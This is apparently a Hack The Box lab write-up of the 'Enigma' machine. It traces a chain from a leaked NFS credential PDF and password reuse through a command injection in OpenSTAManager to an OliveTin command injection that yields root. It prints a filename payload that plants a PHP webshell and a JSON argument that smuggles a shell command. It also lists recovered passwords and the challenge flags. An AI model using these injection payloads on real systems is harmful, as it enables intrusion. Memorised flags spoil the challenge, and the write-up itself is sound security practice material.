# Enigma (HTB #915) — Full Compromise

**Target:** 10.129.106.128  
**Date:** 2026-08-29  
**Phase:** Owned (user + root)

---

## Flags

| Type | Flag | Status |
|------|------|--------|
| User | `4ba97310f3701a33cf4ed23445445621` | Submitted ✓ |
| Root | `5721fdebe7c02204cba46ff9c993a7aa` | Submitted ✓ |

---

## Attack Chain Summary

```
NFS /srv/nfs/onboarding (*)
  └─ New_Employee_Access.pdf → kevin:Enigma2024!
       └─ IMAP/Roundcube @ mail001.enigma.htb
            └─ Sarah welcome email → sarah@enigma.htb
                 └─ sarah:Enigma2024! (password reuse)
                      └─ IT email → admin:Ne3s4rtars78s @ support_001.enigma.htb
                           └─ OpenSTAManager 2.9.8 → CVE-2025-69212 RCE (www-data)
                                └─ su haris:bestfriends → user.txt
                                     └─ OliveTin :1337 cmd inj in db_pass → root.txt
```

---

## Port Summary

| Port | Service | Notes |
|------|---------|-------|
| 22 | OpenSSH 9.6p1 (Ubuntu) | Publickey only (no password auth observed) |
| 80 | nginx 1.24.0 | vhost-based; see web section |
| 110 | Dovecot POP3 | Plaintext auth disabled |
| 111 | rpcbind | NFS stack present |
| 143 | Dovecot IMAP | STARTTLS; LOGINDISABLED pre-TLS |
| 993 | Dovecot IMAPS | AUTH=PLAIN |
| 995 | Dovecot POP3S | AUTH=PLAIN |
| 2049 | NFS | `/srv/nfs/onboarding` exported to `*` |
| 1337 | OliveTin (internal) | Root-owned; auth disabled; cmd inj in backup action |

---

## Initial Access — NFS → Mail

### NFS Export

```
showmount -e 10.129.106.128
/srv/nfs/onboarding *
```

**PDF contents:** kevin / Enigma2024! / http://mail001.enigma.htb

### Kevin's Mailbox (IMAPS :993)

- **Login:** `kevin` / `Enigma2024!`
- **INBOX (1 msg):** Welcome from sarah@enigma.htb — mentions IT will deliver creds via company shared drive (the NFS export)

### Sarah's Mailbox (password reuse)

- **Login:** `sarah` / `Enigma2024!`
- **INBOX (1 msg):** IT reply with OpenSTAManager creds:
  - URL: http://support_001.enigma.htb
  - Username: `admin`
  - Password: `Ne3s4rtars78s`

---

## Foothold — OpenSTAManager CVE-2025-69212

**App:** OpenSTAManager 2.9.8 @ `support_001.enigma.htb`  
**Vuln:** OS command injection in `XML::decodeP7M()` via malicious `.p7m` filename inside uploaded ZIP (`importFE_ZIP` plugin)

**Exploit params:**
- Module ID: 14, Plugin ID: 48
- Payload filename: `1.p7m";cd files;echo '<?php system($_GET[0]); ?>'>s.php;echo "1.p7m`
- Webshell: `http://support_001.enigma.htb/files/s.php?0=<cmd>`
- Result: RCE as `www-data`

**Exploit script:** `exploit.py`

---

## User Flag — haris

- Password `bestfriends` found in OpenSTAManager config/database (haris is a local user)
- Pivot: upload `/tmp/run.py` via webshell to automate `su - haris`
- **user.txt:** `/home/haris/user.txt` → `4ba97310f3701a33cf4ed23445445621`

---

## Privesc — OliveTin Command Injection

- **Service:** OliveTin listening on `127.0.0.1:1337` (root-owned)
- **Misconfig:** Authentication disabled
- **Vuln:** `backup_database` action passes `db_pass` argument unsanitized into shell command
- **Payload:**

```json
{
  "actionId": "backup_database",
  "arguments": [
    {"name": "db_user", "value": "backup_svc"},
    {"name": "db_pass", "value": "x' ; cat /root/root.txt ; #"},
    {"name": "db_name", "value": "production"}
  ]
}
```

- Triggered via curl from haris shell to localhost:1337
- **root.txt:** `5721fdebe7c02204cba46ff9c993a7aa`

---

## Vhost Reference

| Vhost | App |
|-------|-----|
| enigma.htb | Static marketing site |
| mail001.enigma.htb | Roundcube Webmail 1.6.16 |
| support_001.enigma.htb | OpenSTAManager 2.9.8 |

Use `--resolve` or `Host:` headers; e.g.:
```bash
curl --resolve support_001.enigma.htb:80:10.129.106.128 http://support_001.enigma.htb/
curl -H "Host: mail001.enigma.htb" http://10.129.106.128/
```

---

## Credentials Recovered

| User | Password | Source |
|------|----------|--------|
| kevin | Enigma2024! | NFS onboarding PDF |
| sarah | Enigma2024! | Password reuse |
| admin | Ne3s4rtars78s | Sarah's IT email |
| haris | bestfriends | OpenSTAManager / local user |

---

## HTB Submission

```bash
./htb/scripts/own.sh 915 enigma user 4ba97310f3701a33cf4ed23445445621  # accepted
./htb/scripts/own.sh 915 enigma root 5721fdebe7c02204cba46ff9c993a7aa  # accepted (machine_pwned: true)
```

---

## Walkthrough

Public writeup (masked flags): [`../../notes/walkthrough-enigma.md`](../../notes/walkthrough-enigma.md)

---

## Artifacts

- `exploit.py` — full automated chain
- `web/index.html`, `web/mail001_index.html`
- `nfs/New_Employee_Access.pdf`
- `nmap/services.txt`, `nmap/allports.txt`
